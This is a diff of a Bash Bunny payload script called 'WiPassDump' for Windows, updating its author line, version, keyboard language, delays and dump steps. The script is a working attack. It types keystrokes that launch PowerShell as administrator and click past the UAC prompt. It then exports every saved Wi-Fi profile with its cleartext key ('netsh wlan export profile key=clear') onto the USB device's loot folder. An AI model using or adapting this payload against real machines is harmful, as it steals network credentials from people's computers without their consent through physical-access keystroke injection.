@@ -1,8 +1,8 @@
 #!/bin/bash
 #
 # Title:         WiPassDump
-# Author:        samdeg555
-# Version:       1.0
+# Author:        samdeg555, nullhart
+# Version:       1.1
 # Target:        Windows
 # 
 # Runs powershell as Administrator
@@ -10,47 +10,44 @@
 # Dumps cleartext Wi-Fi passwords and infos to the Bash Bunny
 #
 
-LED R 200
+
 
 # Create directory to dump infos
 mkdir -p /root/udisk/loot/WiPassDump
 
-# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
-source bunny_helpers.sh
-
 # Set language accordingly
-Q SET_LANGUAGE ca
+Q SET_LANGUAGE us
 
 ATTACKMODE HID STORAGE
 
-LED B 200
 
 # Launch powershell as admin
 Q GUI r
-Q DELAY 100
+Q DELAY 1000
 Q STRING powershell Start-Process powershell -Verb runAs
 Q ENTER
 
 # Bypass UAC
 Q DELAY 3000
-Q ALT o
+Q LEFTARROW
 Q ENTER
-Q DELAY 500
+Q DELAY 2000
 
-# Start a.cmd
-Q STRING '.((gwmi win32_volume -f '"'"'label='"''"'BashBunny'"'''"').Name+'"'"'payloads/'
-Q STRING $SWITCH_POSITION
-Q STRING '/a.cmd'"'"')'
+# Start Dump
+Q STRING '$Drive = Get-WMIObject Win32_Volume | ? { $_.Label -eq "BashBunny" } | select -ExpandProperty "name"'
+Q DELAY 1000
+Q ENTER
+Q STRING cd '$Drive\loot\WiPassDump\'
+Q DELAY 1000
+Q ENTER
+Q STRING netsh wlan export profile key=clear
 Q ENTER
 
-# Wait for a.cmd to finish and exit
-
-LED R B 500
-
+#Wait for command to finish
 Q DELAY 3000
 Q STRING exit
 Q ENTER
 
 sync
 
-LED G
+LED G 
